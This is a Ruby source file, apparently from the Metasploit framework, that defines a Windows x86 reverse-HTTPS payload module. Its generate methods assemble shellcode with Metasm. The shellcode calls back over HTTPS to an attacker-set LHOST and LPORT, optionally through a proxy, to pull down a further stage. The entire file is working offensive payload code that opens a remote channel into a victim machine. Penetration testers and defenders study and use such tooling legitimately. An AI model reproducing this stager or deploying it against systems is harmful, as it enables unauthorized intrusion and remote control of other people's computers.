# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/reverse_http'

module Msf


###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTPS
#
###


module Payload::Windows::ReverseHttps

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate and compile the stager
  #
  def generate_reverse_https(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_http(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate the first stage
  #
  def generate

    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      return generate_reverse_https(
        ssl:  true,
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  generate_small_uri,
        retry_count: datastore['StagerRetryCount'])
    end

    conf = {
      ssl:  true,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  generate_uri,
      exitfunk: datastore['EXITFUNC'],
      proxy_host: datastore['PayloadProxyHost'],
      proxy_port: datastore['PayloadProxyPort'],
      proxy_user: datastore['PayloadProxyUser'],
      proxy_pass: datastore['PayloadProxyPass'],
      proxy_type: datastore['PayloadProxyType'],
      retry_count: datastore['StagerRetryCount']
    }

    generate_reverse_https(conf)
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_https(opts)
  end

end

end

